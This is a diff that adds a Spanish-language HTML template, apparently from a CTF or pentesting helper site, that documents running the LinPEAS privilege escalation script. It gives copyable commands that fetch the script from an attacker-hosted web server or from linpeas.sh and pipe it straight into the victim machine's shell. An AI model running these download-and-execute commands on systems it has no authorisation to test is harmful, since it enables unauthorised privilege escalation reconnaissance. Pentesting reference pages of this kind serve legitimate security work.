@@ -1,0 +1,125 @@
+{% extends "base.html" %}
+
+{% block title %}0xFlag - PEASS-ng{% endblock %}
+
+{% block content %}
+
+<div class="container px-5 my-5">
+    
+    <div class="text-center text-white mb-5">
+        <h1 class="fw-bolder">PEASS-ng</h1>
+        <p class="lead text-white-50">Privilege Escalation Awesome Scripts Suite</p>
+    </div>
+
+    <div class="row g-4 justify-content-center">
+        
+        <div class="col-lg-6">
+            <h3 class="fw-bold mb-4 text-center text-white">LinPEAS</h3>
+
+            <div class="accordion accordion-flush" id="accordionLinpeas">
+                
+                <div class="accordion-item mb-3" style="background: transparent; border: none;">
+                    <h2 class="accordion-header" id="headingLinNoNet">
+                        <button class="accordion-button collapsed rounded-top" type="button" data-bs-toggle="collapse" data-bs-target="#collapseLinNoNet" 
+                                style="background-color: #0b132b; color: white; box-shadow: none; border-bottom: 1px solid #ffffff1a;">
+                            <i class="fas fa-network-wired me-2"></i> Máquina Víctima (Sin Internet)
+                        </button>
+                    </h2>
+                    <div id="collapseLinNoNet" class="accordion-collapse collapse" data-bs-parent="#accordionLinpeas" 
+                         style="background-color: #475569; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px;">
+                        <div class="accordion-body p-4">
+                            
+                            <div class="mb-3">
+                                <label class="text-white fw-bold small">1. Descargar (Tu máquina):</label>
+                                <div class="input-group">
+                                    <input type="text" class="form-control border-0 font-monospace" id="lin_step1"
+                                           value="wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" readonly 
+                                           style="background-color: #0f172a; color: white;">
+                                    <button class="btn border-0 btn-copy" type="button" data-target="lin_step1" style="background-color: #1e293b; color: white;">
+                                        <i class="bi bi-clipboard"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div class="mb-3">
+                                <label class="text-white fw-bold small">2. Servidor Web (Tu máquina):</label>
+                                <div class="input-group">
+                                    <input type="text" class="form-control border-0 font-monospace" id="lin_step2"
+                                           value="python3 -m http.server 80" readonly 
+                                           style="background-color: #0f172a; color: white;">
+                                    <button class="btn border-0 btn-copy" type="button" data-target="lin_step2" style="background-color: #1e293b; color: white;">
+                                        <i class="bi bi-clipboard"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div>
+                                <label class="text-white fw-bold small">3. Ejecutar (Víctima):</label>
+                                <div class="input-group">
+                                    <input type="text" class="form-control border-0 font-monospace" id="lin_step3"
+                                           value="curl http://{{ config.get('attacker_ip', 'TU_IP') }}/linpeas.sh | sh" readonly 
+                                           style="background-color: #0f172a; color: white;">
+                                    <button class="btn border-0 btn-copy" type="button" data-target="lin_step3" style="background-color: #1e293b; color: white;">
+                                        <i class="bi bi-clipboard"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item mb-3" style="background: transparent; border: none;">
+                    <h2 class="accordion-header" id="headingLinNet">
+                        <button class="accordion-button collapsed rounded-top" type="button" data-bs-toggle="collapse" data-bs-target="#collapseLinNet" 
+                                style="background-color: #0b132b; color: white; box-shadow: none; border-bottom: 1px solid #ffffff1a;">
+                            <i class="fas fa-globe me-2"></i> Máquina Víctima (Con Internet)
+                        </button>
+                    </h2>
+                    <div id="collapseLinNet" class="accordion-collapse collapse" data-bs-parent="#accordionLinpeas" 
+                         style="background-color: #475569; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px;">
+                        <div class="accordion-body p-4">
+                            <label class="text-white fw-bold small">Comando directo:</label>
+                            <div class="input-group">
+                                <input type="text" class="form-control border-0 font-monospace" id="lin_net"
+                                       value="curl -L https://linpeas.sh | sh" readonly 
+                                       style="background-color: #0f172a; color: white;">
+                                <button class="btn border-0 btn-copy" type="button" data-target="lin_net" style="background-color: #1e293b; color: white;">
+                                    <i class="bi bi-clipboard"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item mb-3" style="background: transparent; border: none;">
+                    <h2 class="accordion-header" id="headingLinUrl">
+                        <button class="accordion-button collapsed rounded-top" type="button" data-bs-toggle="collapse" data-bs-target="#collapseLinUrl" 
+                                style="background-color: #0b132b; color: white; box-shadow: none; border-bottom: 1px solid #ffffff1a;">
+                            <i class="fas fa-link me-2"></i> URLs de interés
+                        </button>
+                    </h2>
+                    <div id="collapseLinUrl" class="accordion-collapse collapse" data-bs-parent="#accordionLinpeas" 
+                         style="background-color: #475569; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px;">
+                        <div class="accordion-body p-4">
+                            <div class="d-grid gap-3">
+                                <a href="https://github.com/peass-ng/PEASS-ng" target="_blank" class="btn text-start text-white" style="background-color: #0f172a; border: 1px solid #1e293b;">
+                                    <i class="fab fa-github me-2"></i> Repositorio Oficial
+                                </a>
+                                <a href="https://www.kali.org/tools/peass-ng/" target="_blank" class="btn text-start text-white" style="background-color: #0f172a; border: 1px solid #1e293b;">
+                                    <i class="fas fa-book me-2"></i> Documentación Kali
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+
+
+    </div>
+</div>
+
+{% endblock %}
